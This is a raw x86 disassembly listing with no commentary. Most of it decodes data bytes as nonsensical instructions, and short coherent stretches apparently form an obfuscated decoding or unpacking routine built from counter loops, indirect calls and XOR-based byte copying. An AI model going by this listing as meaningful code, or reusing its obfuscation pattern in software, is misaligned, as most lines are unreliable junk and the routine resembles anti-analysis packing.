  4028e6:	fidivr DWORD PTR [eax+0x39de0451]
  4028ec:	mov    al,ds:0x8535d0c
  4028f1:	jle    0x402971
  4028f3:	push   ds
  4028f4:	jg     0x402974
  4028f6:	jle    0x402932
  4028f8:	into   
  4028f9:	ret    0x9760
  4028fc:	jl     0x402913
  4028fe:	cmp    dh,BYTE PTR [eax+0x5f]
  402901:	ja     0x402965
  402903:	xlat   BYTE PTR ds:[ebx]
  402904:	repz push ss
  402906:	mov    WORD PTR [ebx+0x108b3d3f],?
  40290c:	aas    
  40290d:	dec    eax
  40290e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40290f:	and    BYTE PTR [esi-0x1c],0xd7
  402913:	scas   eax,DWORD PTR es:[edi]
  402914:	cmc    
  402915:	or     eax,0xe2e35363
  40291a:	test   al,0x31
  40291c:	stos   BYTE PTR es:[edi],al
  40291d:	sahf   
  40291e:	jmp    0xa144e8c7
  402923:	pop    esp
  402924:	pop    edi
  402925:	dec    esi
  402926:	pop    ebp
  402927:	mov    ebx,0x2f17115e
  40292c:	ins    DWORD PTR es:[edi],dx
  40292d:	xor    esp,0x3581cbd6
  402933:	pop    ebp
  402934:	test   DWORD PTR [esi+0x703ae09f],esi
  40293a:	add    eax,0xab21eeee
  40293f:	fwait
  402940:	mov    bh,0xc6
  402942:	mov    eax,fs
  402944:	inc    ecx
  402945:	xor    dl,BYTE PTR [eax]
  402947:	fld    QWORD PTR [edx+0xe]
  40294a:	mov    dh,0xe1
  40294c:	xchg   edi,eax
  40294d:	jle    0x40290d
  40294f:	cld    
  402950:	sub    dh,cl
  402952:	cs aam 0xef
  402955:	test   al,0x33
  402957:	mov    BYTE PTR [eax],dh
  402959:	popf   
  40295a:	stos   BYTE PTR es:[edi],al
  40295b:	jmp    0x4029ba
  40295d:	fxch   st(3)
  40295f:	mov    dh,0xfe
  402961:	mov    al,ds:0xfb47f3e5
  402966:	cmp    DWORD PTR [ecx],0xffffff9f
  402969:	aas    
  40296a:	jecxz  0x4028ff
  40296c:	mov    ds:0xa4247d7d,al
  402971:	scas   eax,DWORD PTR es:[edi]
  402972:	xor    BYTE PTR [edi-0x47],bl
  402975:	dec    esp
  402976:	sub    eax,0xfac1929a
  40297b:	cmp    BYTE PTR [esi+edi*1],dh
  40297e:	lods   eax,DWORD PTR ds:[esi]
  40297f:	shld   DWORD PTR [edx+ebx*1-0x61],ecx,cl
  402984:	arpl   dx,di
  402986:	add    DWORD PTR [esi],0x3c
  402989:	into   
  40298a:	sbb    edx,DWORD PTR [ebx+0x62]
  40298d:	out    0x80,al
  40298f:	outs   dx,DWORD PTR ds:[esi]
  402990:	jmp    0x1716:0xe8074bf5
  402997:	pushf  
  402998:	sbb    BYTE PTR [edi],dh
  40299a:	dec    ecx
  40299b:	xlat   BYTE PTR ds:[ebx]
  40299c:	aam    0x66
  40299e:	lds    eax,FWORD PTR [edx]
  4029a0:	cs push edx
  4029a2:	dec    ecx
  4029a3:	imul   eax,DWORD PTR [ebx+edi*1-0x42856a8f],0xffffff90
  4029ab:	clc    
  4029ac:	jnp    0x40299a
  4029ae:	inc    ebp
  4029af:	fst    QWORD PTR [ecx-0x1b4ffa2d]
  4029b5:	jmp    0x4c1831e9
  4029ba:	test   eax,0x12b92a0a
  4029bf:	sub    al,0xc2
  4029c1:	cmp    al,0xa4
  4029c3:	push   0x22ae7d8
  4029c8:	pop    ss
  4029c9:	cli    
  4029ca:	adc    BYTE PTR [edx],0xcd
  4029cd:	xchg   ebx,eax
  4029ce:	jg     0x402953
  4029d0:	hlt    
  4029d1:	ret    
  4029d2:	adc    al,0x92
  4029d4:	or     eax,0x7b5f5a62
  4029d9:	mov    bh,0x40
  4029db:	sub    BYTE PTR [esi+0x8],dl
  4029de:	dec    ebx
  4029df:	jp     0x402a12
  4029e1:	sbb    al,0xcd
  4029e3:	fdiv   QWORD PTR [ebx-0x4d]
  4029e6:	push   ss
  4029e7:	scas   al,BYTE PTR es:[edi]
  4029e8:	or     DWORD PTR [esi-0x48],ebx
  4029eb:	sub    al,0x53
  4029ed:	add    DWORD PTR [edx-0x6915dbbc],esp
  4029f3:	pop    es
  4029f4:	ins    DWORD PTR es:[edi],dx
  4029f5:	(bad)  
  4029f6:	outs   dx,BYTE PTR ds:[esi]
  4029f7:	xchg   edi,eax
  4029f8:	push   ecx
  4029f9:	(bad)  
  4029fa:	aas    
  4029fb:	xor    DWORD PTR [edx-0x9],esi
  4029fe:	or     eax,0xfe3016e3
  402a03:	mov    bl,BYTE PTR [edi-0x4acc0e0b]
  402a09:	inc    esp
  402a0a:	aam    0xed
  402a0c:	xchg   BYTE PTR [edi+0x5c],al
  402a0f:	mov    esi,0x67505550
  402a14:	xchg   DWORD PTR [edi],esp
  402a16:	into   
  402a17:	push   ecx
  402a18:	and    DWORD PTR ds:0x434687,0x0
  402a22:	jmp    0x402a34
  402a27:	mov    edx,DWORD PTR ds:0x434687
  402a2d:	inc    edx
  402a2e:	mov    DWORD PTR ds:0x434687,edx
  402a34:	cmp    DWORD PTR ds:0x434687,0x17
  402a3b:	jae    0x402a84
  402a41:	cmp    DWORD PTR ds:0x434687,0x4
  402a48:	jne    0x402a59
  402a4e:	push   0x4345e3
  402a53:	call   DWORD PTR ds:0x413330
  402a59:	cmp    DWORD PTR ds:0x434687,0x3
  402a60:	jne    0x402a75
  402a66:	xor    edx,edx
  402a68:	or     edx,DWORD PTR ds:0x434687
  402a6e:	inc    edx
  402a6f:	mov    DWORD PTR ds:0x434687,edx
  402a75:	jmp    0x402a27
  402a7a:	xor    DWORD PTR ds:0x4345ff,0x2c9d
  402a84:	push   ecx
  402a85:	sbb    ecx,ecx
  402a87:	mov    eax,0xf89c8536
  402a8c:	sbb    DWORD PTR ds:0x43463b,edi
  402a92:	mov    DWORD PTR [ebp-0x8],eax
  402a95:	and    DWORD PTR ds:0x434677,0x0
  402a9f:	mov    ecx,DWORD PTR ds:0x434677
  402aa5:	inc    ecx
  402aa6:	mov    DWORD PTR ds:0x434677,ecx
  402aac:	cmp    DWORD PTR ds:0x434677,0x25
  402ab3:	jne    0x402ac4
  402ab9:	push   0x8c9d
  402abe:	call   DWORD PTR ds:0x4133f4
  402ac4:	cmp    DWORD PTR ds:0x434677,0x19
  402acb:	jb     0x402a9f
  402ad1:	add    ecx,DWORD PTR ds:0x43470f
  402ad7:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  402ade:	mov    edx,DWORD PTR [ebp-0x8]
  402ae1:	push   esi
  402ae2:	mov    ecx,DWORD PTR ds:0x4346fb
  402ae8:	or     DWORD PTR ds:0x4346c7,ecx
  402aee:	mov    ecx,0x7510851
  402af3:	xor    edx,ecx
  402af5:	mov    esi,0x327299
  402afa:	push   edi
  402afb:	add    DWORD PTR ds:0x4346b7,ebx
  402b01:	mov    edi,DWORD PTR [ebp+0x10]
  402b04:	sbb    DWORD PTR ds:0x4346c3,0x434603
  402b0e:	jmp    0x402c4b
  402b13:	pop    ss
  402b14:	imul   ecx,DWORD PTR ds:0x7d726d66,0xc1f40369
  402b1e:	(bad)  
  402b1f:	lods   eax,DWORD PTR ds:[esi]
  402b20:	adc    dl,ah
  402b22:	call   0x7ebe349a
  402b27:	push   ds
  402b28:	jg     0x402ba8
  402b2a:	jle    0x402ad6
  402b2c:	shl    DWORD PTR ss:[edx+0x33e7df2c],cl
  402b33:	lods   eax,DWORD PTR cs:[esi]
  402b35:	popa   
  402b36:	add    BYTE PTR [ebx+0x20],bl
  402b39:	xor    al,0x7f
  402b3b:	(bad)  
  402b3c:	icebp  
  402b3d:	cdq    
  402b3e:	imul   al
  402b40:	add    al,0xb
  402b42:	ins    DWORD PTR es:[edi],dx
  402b43:	jno    0x402b72
  402b45:	stc    
  402b46:	pop    eax
  402b47:	adc    ebx,DWORD PTR [ecx-0x43]
  402b4a:	std    
  402b4b:	xor    DWORD PTR [esp+edi*1-0x217dd621],edx
  402b52:	add    DWORD PTR [esi+0x5280452d],ebp
  402b58:	out    0xe7,eax
  402b5a:	retf   0xff6e
  402b5d:	mov    ebp,0xdfd7916a
  402b62:	pop    ebp
  402b63:	xchg   ebx,eax
  402b64:	jno    0x402b4d
  402b66:	pop    ecx
  402b67:	sub    DWORD PTR [eax+0x7f047f8a],0xc
  402b6e:	jno    0x402b37
  402b70:	sar    DWORD PTR [ebx+0x8],1
  402b73:	sti    
  402b74:	in     eax,0xc6
  402b76:	or     BYTE PTR [ecx-0x3c],0xc7
  402b7a:	add    eax,ebp
  402b7c:	sub    eax,0x6f8c696b
  402b81:	call   0x449468f7
  402b86:	mov    ebx,0xd28dab23
  402b8b:	dec    ecx
  402b8c:	(bad)  
  402b8d:	pusha  
  402b8e:	jg     0x402b67
  402b90:	and    si,WORD PTR [edx+0x60cebc84]
  402b97:	xchg   esp,eax
  402b98:	imul   esp,DWORD PTR [edi+0x6d],0x4f75eb28
  402b9f:	mov    ds:0xf81e85b0,eax
  402ba4:	and    al,0xed
  402ba6:	sub    eax,0x11af21f3
  402bab:	pop    edi
  402bac:	ror    al,0xda
  402baf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bb0:	add    ebx,DWORD PTR [eax-0x4f]
  402bb3:	mov    ch,0x15
  402bb5:	scas   eax,DWORD PTR es:[edi]
  402bb6:	push   es
  402bb7:	(bad)  
  402bb8:	or     al,0x85
  402bba:	std    
  402bbb:	jl     0x402c18
  402bbd:	inc    edi
  402bbe:	xor    al,0xa5
  402bc0:	jmp    0xf2ed:0x8fb3255d
  402bc7:	fwait
  402bc8:	jp     0x402b97
  402bca:	pinsrw mm1,WORD PTR [eax+0x63],0x28
  402bcf:	adc    eax,0xf1860e4c
  402bd4:	lea    eax,[ecx-0x31]
  402bd7:	ret    0x8fb7
  402bda:	fild   DWORD PTR [eax]
  402bdc:	std    
  402bdd:	stc    
  402bde:	mov    WORD PTR [ebp+0x70],?
  402be1:	and    DWORD PTR [eax],ebp
  402be3:	jmp    0x402bc6
  402be5:	sbb    eax,0x6366a038
  402bea:	cli    
  402beb:	stos   DWORD PTR es:[edi],eax
  402bec:	adc    BYTE PTR [bx],dl
  402bef:	xchg   DWORD PTR [ebx],edx
  402bf1:	xchg   esp,eax
  402bf2:	loop   0x402b87
  402bf4:	or     al,0xfd
  402bf6:	jno    0x402b94
  402bf8:	shl    DWORD PTR [eax],0x8f
  402bfb:	rcr    BYTE PTR [ecx+0x702c8e3e],1
  402c01:	aaa    
  402c02:	add    edi,esp
  402c04:	mov    dh,0xbe
  402c06:	xor    eax,0x1489a072
  402c0b:	mov    ds:0x91f7f68d,al
  402c10:	cmc    
  402c11:	das    
  402c12:	mov    edx,0xffdcd767
  402c17:	mov    ds:0x6da6f243,al
  402c1c:	jne    0x402c95
  402c1e:	retf   
  402c1f:	inc    ebp
  402c20:	cdq    
  402c21:	retf   0x55d0
  402c24:	inc    ebp
  402c25:	outs   dx,DWORD PTR ds:[esi]
  402c26:	jp     0x402c10
  402c28:	cs in  eax,0x8a
  402c2b:	in     eax,0xf6
  402c2d:	jle    0x402c5a
  402c2f:	push   ds
  402c30:	xchg   BYTE PTR [edi+eiz*2+0x1145f783],al
  402c37:	jno    0x402c63
  402c39:	ds cld 
  402c3b:	sub    edi,DWORD PTR [ecx+0x9]
  402c3e:	dec    esp
  402c3f:	and    al,0x1d
  402c41:	clc    
  402c42:	cmc    
  402c43:	xchg   DWORD PTR [edx],esi
  402c45:	cmc    
  402c46:	and    eax,0xcbaf5519
  402c4b:	add    edx,esi
  402c4d:	cmp    edi,edx
  402c4f:	je     0x402e4c
  402c55:	and    DWORD PTR ds:0x434607,0x0
  402c5f:	mov    eax,ds:0x434607
  402c64:	inc    eax
  402c65:	mov    ds:0x434607,eax
  402c6a:	cmp    DWORD PTR ds:0x434607,0x17
  402c71:	jne    0x402c80
  402c77:	push   DWORD PTR [ebp-0xc]
  402c7a:	call   DWORD PTR ds:0x4133f8
  402c80:	cmp    DWORD PTR ds:0x434607,0x16
  402c87:	jb     0x402c5f
  402c8d:	xor    eax,0x6036
  402c92:	mov    edx,DWORD PTR [ebp-0x8]
  402c95:	mov    eax,DWORD PTR [ebp-0x4]
  402c98:	xor    eax,ecx
  402c9a:	mov    edi,0xffcd8d67
  402c9f:	xor    DWORD PTR ds:0x4345e7,0x434713
  402ca9:	sub    edi,eax
  402cab:	add    edi,DWORD PTR [ebp+0x10]
  402cae:	xor    edx,ecx
  402cb0:	add    edx,esi
  402cb2:	cmp    edx,edi
  402cb4:	ja     0x402e47
  402cba:	push   ebx
  402cbb:	jmp    0x402cc5
  402cc0:	mov    esi,0x327299
  402cc5:	mov    eax,DWORD PTR [ebp-0x8]
  402cc8:	mov    edi,DWORD PTR [ebp-0x4]
  402ccb:	xor    edi,ecx
  402ccd:	add    edi,esi
  402ccf:	mov    esi,DWORD PTR [ebp+0x8]
  402cd2:	imul   edi,edx
  402cd5:	jmp    0x402e12
  402cda:	push   ebp
  402cdb:	nop
  402cdc:	outs   dx,BYTE PTR ds:[esi]
  402cdd:	stos   DWORD PTR es:[edi],eax
  402cde:	jae    0x402d5d
  402ce0:	push   ebp
  402ce1:	jo     0x402cac
  402ce3:	sub    esi,esp
  402ce5:	lods   eax,DWORD PTR ds:[esi]
  402ce6:	inc    edi
  402ce7:	cwde   
  402ce8:	fisttp QWORD PTR [edx+0x13]
  402ceb:	or     edi,DWORD PTR [esi+0x7e]
  402cee:	push   ds
  402cef:	jg     0x402d6f
  402cf1:	jle    0x402cb1
  402cf3:	shl    BYTE PTR [edi+edi*8-0x5],0xed
  402cf8:	or     eax,0x13407f8a
  402cfd:	dec    edi
  402cfe:	(bad)  
  402cff:	cwde   
  402d00:	mov    ebx,0xe256b434
  402d05:	out    0x95,eax
  402d07:	dec    esp
  402d08:	in     al,dx
  402d09:	ins    BYTE PTR es:[edi],dx
  402d0a:	ss (bad) 
  402d0c:	shl    BYTE PTR [eax-0x29eb0867],1
  402d12:	dec    edi
  402d13:	js     0x402d0a
  402d15:	fidivr WORD PTR ds:0xe4e36597
  402d1b:	add    cl,BYTE PTR [edx+ebx*1]
  402d1e:	mov    al,0x92
  402d20:	nop
  402d21:	enter  0x1d78,0xff
  402d25:	sub    DWORD PTR [ecx-0x23],edx
  402d28:	add    eax,0x6fd9bea1
  402d2d:	bound  esi,QWORD PTR [ecx+0x75]
  402d30:	pop    edx
  402d31:	inc    esp
  402d32:	mov    ch,0x6
  402d34:	pop    ds
  402d35:	and    al,0xd2
  402d37:	mov    ecx,DWORD PTR ds:0xb48dab3c
  402d3d:	ret    
  402d3e:	jae    0x402d56
  402d40:	fbstp  TBYTE PTR [ebx+0x31a11a15]
  402d46:	adc    DWORD PTR [ecx+0x3c],0x3bc7d763
  402d4d:	neg    dl
  402d4f:	data16 ins BYTE PTR es:[edi],dx
  402d51:	outs   dx,BYTE PTR ds:[esi]
  402d52:	push   eax
  402d53:	clc    
  402d54:	mov    WORD PTR [eax],es
  402d56:	pop    es
  402d57:	cmp    esp,DWORD PTR [ecx+esi*1+0x6e]
  402d5b:	lock lods eax,DWORD PTR ds:[esi]
  402d5d:	sub    eax,0x7cdd218f
  402d62:	loop   0x402d65
  402d64:	xchg   ebp,eax
  402d65:	scas   eax,DWORD PTR es:[edi]
  402d66:	mov    al,BYTE PTR [ebx+0x5e]
  402d69:	imul   eax,DWORD PTR [esp+ebx*8-0x34],0x24
  402d6e:	xlat   BYTE PTR ds:[ebx]
  402d6f:	loop   0x402d47
  402d71:	ret    0xda87
  402d74:	in     al,0x3b
  402d76:	fst    QWORD PTR [ecx-0x7a]
  402d79:	(bad)  
  402d7a:	nop
  402d7b:	cmp    BYTE PTR [esi+0x20],ah
  402d7e:	jge    0x402d0f
  402d80:	rcl    ecx,0x73
  402d83:	ja     0x402dc7
  402d85:	repz sub DWORD PTR [ecx],eax
  402d88:	fidiv  WORD PTR [ecx]
  402d8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d8b:	jno    0x402d41
  402d8d:	loope  0x402d56
  402d8f:	jns    0x402d4c
  402d91:	in     al,dx
  402d92:	xor    al,0xb4
  402d94:	cmp    al,0xc6
  402d96:	lds    ebp,FWORD PTR [edi]
  402d98:	out    0x63,al
  402d9a:	sub    DWORD PTR [eax],edx
  402d9c:	shl    DWORD PTR [eax],0xdf
  402d9f:	mov    al,0x8e
  402da1:	(bad)  
  402da2:	push   eax
  402da3:	inc    edi
  402da4:	sbb    ch,BYTE PTR [edx+0x57]
  402da7:	icebp  
  402da8:	fst    st(1)
  402daa:	int    0x75
  402dac:	pop    edi
  402dad:	sbb    DWORD PTR [eax],ebp
  402daf:	nop
  402db0:	bound  esi,QWORD PTR [ecx-0x9faae07]
  402db6:	push   ss
  402db7:	push   ebx
  402db8:	aaa    
  402db9:	inc    BYTE PTR [eax]
  402dbb:	int    0x9d
  402dbd:	loope  0x402db6
  402dbf:	and    DWORD PTR [ebp+ebp*4-0x3],edi
  402dc3:	lock std 
  402dc5:	xchg   DWORD PTR [esi],edx
  402dc7:	(bad)  
  402dc8:	repnz pop esi
  402dca:	mov    DWORD PTR [esi-0x3d],edi
  402dcd:	imul   edx,ebx,0xda7d6b5a
  402dd3:	xchg   ebx,eax
  402dd4:	xchg   cl,dl
  402dd6:	icebp  
  402dd7:	pop    esp
  402dd8:	add    ebx,0x8dae5420
  402dde:	ins    DWORD PTR es:[edi],dx
  402ddf:	add    al,0xfb
  402de1:	sbb    esp,DWORD PTR [ebp-0x77]
  402de4:	inc    ecx
  402de5:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  402de7:	jmp    0x73f3:0x1ed61d7c
  402dee:	in     eax,0xef
  402df0:	and    al,0x9
  402df2:	sbb    ebx,ebp
  402df4:	sub    al,0xc1
  402df6:	inc    ebp
  402df7:	ds nop
  402df9:	xor    eax,DWORD PTR [ebx+0x6a09aca3]
  402dff:	adc    esi,edi
  402e01:	push   ds
  402e02:	pop    ecx
  402e03:	push   ds
  402e04:	cmp    BYTE PTR [edi-0x6fe09111],0xaf
  402e0b:	(bad)  
  402e0c:	retf   
  402e0d:	enter  0x3be6,0x83
  402e11:	xlat   BYTE PTR ds:[ebx]
  402e12:	mov    ebx,DWORD PTR [ebp+0xc]
  402e15:	xor    eax,ecx
  402e17:	add    eax,edx
  402e19:	mov    al,BYTE PTR [ebx+eax*1+0x327299]
  402e20:	mov    BYTE PTR [edi+esi*1],al
  402e23:	mov    eax,DWORD PTR [ebp-0x4]
  402e26:	xor    eax,ecx
  402e28:	lea    edx,[edx+eax*1+0x327299]
  402e2f:	mov    eax,DWORD PTR [ebp-0x4]
  402e32:	xor    eax,ecx
  402e34:	mov    esi,0xffcd8d67
  402e39:	sub    esi,eax
  402e3b:	add    esi,DWORD PTR [ebp+0x10]
  402e3e:	cmp    edx,esi
  402e40:	jbe    0x402cc0
  402e46:	pop    ebx
  402e47:	mov    eax,0xf89c8539
  402e4c:	pop    edi
  402e4d:	pop    esi
  402e4e:	leave  
  402e4f:	ret    0xc
  402e52:	push   ebp
  402e53:	mov    ebp,esp
  402e55:	mov    eax,DWORD PTR [ebp+0xc]
  402e58:	xor    edx,edx
  402e5a:	mov    ecx,0x7264fcae
  402e5f:	div    ecx
  402e61:	mov    ecx,DWORD PTR [ebp+0x10]
  402e64:	and    ecx,eax
  402e66:	or     ecx,0x81161d8c
  402e6c:	mov    eax,ecx
  402e6e:	pop    ebp
  402e6f:	ret    0x18
  402e72:	push   ebp
  402e73:	mov    ebp,esp
  402e75:	sub    esp,0x58
  402e78:	and    DWORD PTR ds:0x434677,edi
  402e7e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e81:	jmp    0x403276
  402e86:	inc    ebx
  402e87:	dec    di
  402e89:	fwait
  402e8a:	imul   esi,DWORD PTR [ebx-0x4190998d],0xffffffd0
  402e91:	add    dl,BYTE PTR [ebx]
  402e93:	mov    eax,ds:0x14331ee7
  402e98:	jle    0x402f18
  402e9a:	push   esi
  402e9b:	jns    0x402f1b
  402e9d:	jle    0x402ee7
  402e9f:	jno    0x402e30
  402ea1:	into   
  402ea2:	repz sub edx,DWORD PTR [edx+0x3d]
  402ea6:	lock fsub QWORD PTR [eax-0x5fa04e3a]
  402ead:	xchg   BYTE PTR [eax-0x5ca2242b],ch
  402eb3:	clc    
  402eb4:	or     eax,0x9f8172a
  402eb9:	adc    cl,BYTE PTR [ebp+0x2883c179]
  402ebf:	sar    ebp,cl
  402ec1:	inc    ecx
  402ec2:	pop    eax
  402ec3:	xor    BYTE PTR [edi-0x45],0xe9
  402ec7:	sub    DWORD PTR [ebx],eax
  402ec9:	jge    0x402f47
  402ecb:	loope  0x402ed0
  402ecd:	cmp    esp,0x52
  402ed0:	inc    esi
  402ed1:	pop    ds
  402ed2:	sbb    DWORD PTR [edx],edi
  402ed4:	cdq    
  402ed5:	sub    DWORD PTR [ebx+eiz*8+0x74],ebx
  402ed9:	inc    ebx
  402eda:	adc    ebp,DWORD PTR [edi-0x7f]
  402edd:	lods   eax,DWORD PTR ds:[esi]
  402ede:	xor    DWORD PTR [esi+0x50ab70c0],edi
  402ee4:	js     0x402f1b
  402ee6:	cmp    BYTE PTR [ecx-0x6ef7589c],0xf0
  402eed:	or     BYTE PTR [ebp+0x3],al
  402ef0:	aam    0x43
  402ef2:	pop    ss
  402ef3:	retf   0xc6f8
  402ef6:	push   0xffffff82
  402ef8:	shl    DWORD PTR [eax+esi*1-0x13],1
  402efc:	mov    esi,0x366fbac4
  402f01:	mov    eax,edx
  402f03:	push   ebx
  402f04:	scas   al,BYTE PTR es:[edi]
  402f05:	mov    bh,0x7a
  402f07:	cmp    BYTE PTR cs:[esi+0x74],cl
  402f0b:	ins    DWORD PTR es:[edi],dx
  402f0c:	xor    edi,DWORD PTR [esi+0x73]
  402f0f:	mov    eax,ds:0x902a2585
  402f14:	daa    
  402f15:	dec    ebx
  402f16:	ins    BYTE PTR es:[edi],dx
  402f17:	lds    eax,FWORD PTR [edx-0x13]
  402f1a:	mov    al,0xde
  402f1c:	dec    ebp
  402f1d:	stos   BYTE PTR es:[edi],al
  402f1e:	jno    0x402f20
  402f20:	adc    ah,al
  402f22:	push   ebp
  402f23:	dec    esp
  402f24:	cli    
  402f25:	loopne 0x402ef6
  402f27:	mov    bh,0x72
  402f29:	cli    
  402f2a:	addr16 aad 0x86
  402f2d:	adc    BYTE PTR [eax+0x6794c9e9],cl
  402f33:	jo     0x402f01
  402f35:	add    ebp,esi
  402f37:	daa    
  402f38:	cmp    DWORD PTR [edx+0x66],0x71
  402f3c:	fs ins DWORD PTR es:[edi],dx
  402f3e:	icebp  
  402f3f:	xor    al,0xce
  402f41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f42:	mov    edx,0xd8496f8c
  402f47:	repz or BYTE PTR [esi-0xe0f506a],0x41
  402f4f:	xor    DWORD PTR [esp+ebx*1],edx
  402f52:	jmp    0xc1ed74
  402f57:	cli    
  402f58:	jne    0x402fab
  402f5a:	stc    
  402f5b:	cdq    
  402f5c:	test   esp,eax
  402f5e:	pusha  
  402f5f:	hlt    
  402f60:	(bad)  
  402f61:	xchg   esp,eax
  402f62:	fadd   QWORD PTR [edx-0x38]
  402f65:	(bad)
  402f69:	cld    
  402f6a:	xor    dh,BYTE PTR [edi-0x63e01a88]
  402f70:	mov    edx,es
  402f72:	iret   
  402f73:	cld    
  402f74:	adc    al,0xd7
  402f76:	jb     0x402f38
  402f78:	hlt    
  402f79:	and    DWORD PTR [edi+0x6ac67e45],esi
  402f7f:	retf   0x9886
  402f82:	retf   0x358b
  402f85:	clc    
  402f86:	arpl   WORD PTR [edx-0x40],sp
  402f89:	ds stos BYTE PTR es:[edi],al
  402f8b:	ins    DWORD PTR es:[edi],dx
  402f8c:	(bad)  
  402f8e:	jne    0x402f60
  402f90:	test   DWORD PTR [edx+0xad39bcc],0xea382038
  402f9a:	cmc    
  402f9b:	loop   0x402f44
  402f9d:	ret    
  402f9e:	xor    ch,BYTE PTR [edx+0x172c5516]
  402fa4:	(bad)  [edi+0x62]
  402fa7:	test   DWORD PTR [eax+0x1829ac5],eax
  402fad:	cmc    
  402fae:	js     0x402f72
  402fb0:	scas   al,BYTE PTR es:[edi]
  402fb1:	ins    BYTE PTR es:[edi],dx
  402fb2:	scas   al,BYTE PTR es:[edi]
  402fb3:	and    BYTE PTR [ebx+0x66],bl
  402fb6:	hlt    
  402fb7:	pop    edx
  402fb8:	arpl   bp,bx
  402fba:	or     DWORD PTR [ebp-0x334832a5],ebx
  402fc0:	push   ds
  402fc1:	push   ecx
  402fc2:	nop
  402fc3:	inc    ecx
  402fc4:	jp     0x403035
  402fc6:	mov    BYTE PTR [ebp-0x64],0x2e
  402fca:	mov    ds:0xbcd3f750,eax
  402fcf:	repnz fst DWORD PTR [ecx]
  402fd2:	das    
  402fd3:	imul   eax,esi,0x416542fb
  402fd9:	and    dh,BYTE PTR [esi+0xe]
  402fdc:	imul   eax,DWORD PTR [esi-0x39],0xffffffd8
  402fe0:	adc    ebx,DWORD PTR [edi-0x5166fd42]
  402fe6:	xlat   BYTE PTR ds:[ebx]
  402fe7:	call   0x2ba6316a
  402fec:	cmp    eax,0x85c255b1
  402ff1:	stos   DWORD PTR es:[edi],eax
  402ff2:	call   0xccd4:0x5dc93403
  402ff9:	mul    DWORD PTR [eax+0x49]
  402ffc:	mov    ebp,0x33a2a144
  403001:	dec    edi
  403002:	mov    cl,0x7d
  403004:	repnz dec esp
  403006:	push   es
  403007:	jg     0x402fa7
  403009:	shl    DWORD PTR [ecx-0x7b],0x77
  40300d:	add    al,0x87
  40300f:	add    ebp,edi
  403011:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403012:	and    BYTE PTR [ecx+0x1959f455],cl
  403018:	cmp    al,BYTE PTR [esi+0x62916ccc]
  40301e:	leave  
  40301f:	xchg   ebx,eax
  403020:	and    bh,BYTE PTR [ebx+0x71c514c9]
  403026:	addr16 leave 
  403028:	mov    eax,ds:0x7d68b31a
  40302e:	mov    dh,0x52
  403030:	and    ecx,DWORD PTR [ecx]
  403032:	ins    DWORD PTR es:[edi],dx
  403033:	je     0x402fd1
  403035:	ds scas al,BYTE PTR es:[edi]
  403037:	aas    
  403038:	and    eax,0x3de45ba7
  40303d:	push   esi
  40303e:	xchg   ebx,eax
  40303f:	mov    al,0x54
  403041:	mov    ds:0x21f03513,eax
  403046:	enter  0xd3c4,0xb
  40304a:	add    ecx,ecx
  40304c:	cwde   
  40304d:	sub    esp,DWORD PTR [edi-0x1e]
  403050:	push   0xc785676c
  403055:	push   esp
  403056:	jg     0x402ffd
  403058:	idiv   DWORD PTR [edx]
  40305a:	imul   edi,DWORD PTR [ebp-0x7a],0xffffffbf
  40305e:	pushf  
  40305f:	inc    edx
  403060:	jae    0x4030d4
  403062:	pop    ss
  403063:	cmp    edi,DWORD PTR [ecx]
  403065:	icebp  
  403066:	sub    dh,BYTE PTR [eax]
  403068:	push   edx
  403069:	mov    edx,0x41d55294
  40306e:	icebp  
  40306f:	test   BYTE PTR [esi+esi*8],ah
  403072:	and    DWORD PTR [edx],ebp
  403074:	mov    al,ds:0xa4a24254
  403079:	xchg   edi,eax
  40307a:	pop    ds
  40307b:	add    ch,BYTE PTR [ecx-0x36]
  40307e:	mov    bl,0x49
  403080:	les    esi,FWORD PTR [ebx-0x13]
  403083:	test   al,0x78
  403085:	outs   dx,BYTE PTR ds:[esi]
  403086:	repnz das 
  403088:	jnp    0x403042
  40308a:	iret   
  40308b:	jecxz  0x4030dd
  40308d:	pop    ecx
  40308e:	add    BYTE PTR [ebx-0x1d],cl
  403091:	imul   ebp,DWORD PTR [edx],0x8a06f568
  403097:	mov    ebp,0xe4c19a7a
  40309c:	mov    ds:0x323fa40b,eax
  4030a1:	push   es
  4030a2:	add    al,0x76
  4030a4:	xchg   ecx,eax
  4030a5:	xor    DWORD PTR [ebp-0x6e],eax
  4030a8:	adc    ch,BYTE PTR [eax-0x12]
  4030ab:	add    al,0xe1
  4030ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030ae:	jecxz  0x4030d4
  4030b0:	dec    esp
  4030b1:	mov    bh,0x61
  4030b3:	sub    ebp,DWORD PTR [eax+0x3535646]
  4030b9:	je     0x403043
  4030bb:	sbb    al,bh
  4030bd:	fbld   TBYTE PTR [ecx+0x2f33f7ae]
  4030c3:	or     al,0xaa
  4030c5:	xchg   DWORD PTR [ecx],ecx
  4030c7:	xchg   ebx,eax
  4030c8:	mov    dh,0x86
  4030ca:	(bad)  
  4030cc:	pop    esi
  4030cd:	jbe    0x4030f8
  4030cf:	adc    BYTE PTR [esi],dh
  4030d1:	idiv   esp
  4030d3:	fsubp  st(0),st
  4030d5:	cmp    ch,ah
  4030d7:	jp     0x4030a2
  4030d9:	push   ecx
  4030da:	rcl    dl,1
  4030dc:	and    DWORD PTR [esi-0x41],edx
  4030df:	fnstcw WORD PTR [ebx-0x29dd445e]
  4030e5:	jmp    0x403077
  4030e7:	pop    ebx
  4030e8:	pop    ds
  4030e9:	dec    eax
  4030ea:	ret    
  4030eb:	stos   BYTE PTR es:[edi],al
  4030ec:	xchg   BYTE PTR [edi+0x44],bh
  4030ef:	das    
  4030f0:	fisttp QWORD PTR [ebx]
  4030f2:	sub    al,0x5d
  4030f4:	in     al,0xd2
  4030f6:	pop    ecx
  4030f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030f8:	ss xchg ebp,eax
  4030fa:	inc    ebx
  4030fb:	fs and ebp,ebp
  4030fe:	inc    DWORD PTR [ecx+0x66f94bc5]
  403104:	xor    BYTE PTR [ebp+0xc],ah
  403107:	jp     0x4030be
